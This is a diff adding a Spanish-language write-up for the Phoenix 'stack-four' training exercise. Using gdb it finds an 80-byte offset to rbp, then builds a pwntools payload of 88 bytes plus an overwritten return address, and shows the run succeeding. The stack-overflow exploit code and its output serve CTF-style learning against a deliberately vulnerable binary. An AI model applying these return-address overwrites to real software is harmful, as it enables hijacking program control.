@@ -147,6 +147,57 @@ print(payload)
 [user@phoenix]:$ python /tmp/exploit.py | ./stack-three 
 calling function pointer @ 0x40069d; Congratulations, you've finished phoenix/stack-three :-) Well done!
 ```
+-----------------------------------------------------------------------------------------
+
+## Stack - Four
+
+He metido un par de "A" y con el gdb he parado antes de que salga de la funcíon, luego he abierto la pila a ver que hay.
+Tambien se ve que el input de "A" empieza justo en rsp (la pila)
+
+```
+(gdb) x/40x $rsp
+0x7fffffffe490: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe4a0: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe4b0: 0x41414141      0x41414141      0x41414141      0x00004141
+0x7fffffffe4c0: 0xf7ffb300      0x00007fff      0xf7db9934      0x00007fff
+0x7fffffffe4d0: 0xffffe558      0x00007fff      0x0040068d      0x00000000
+0x7fffffffe4e0: 0xffffe500      0x00007fff      0x0040068d      0x00000000   # despues de rbp esta la direccion de la siguiente funcion
+
+(gdb) x/x $rbp
+0x7fffffffe4e0: 0xffffe500
+(gdb) p/d $rbp - $rsp 
+$2 = 80
+```
+
+Es decir la direccion de la funcion hay que meterla despues de rbp (a mas de 80 de buffer).
+Como estamos en 64 bits, la data es muy larga, por lo que se suele dividir en dos direcciones de memoria, asi que en vez de rbp +4 es +8.
+```
+(gdb) x/x 0x7fffffffe528
+0x7fffffffe528: 0x0040068d
+```
+```python
+from pwn import *
+payload = 'A' * 88
+payload += p64(0x40061d)
+print(payload)
+```
+```console
+[user@phoenix]:$  python /tmp/exploit.py | ./stack-four
+and will be returning to 0x40061d
+Congratulations, you've finished phoenix/stack-four :-) Well done!
+```
+
+---------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
 
 
 
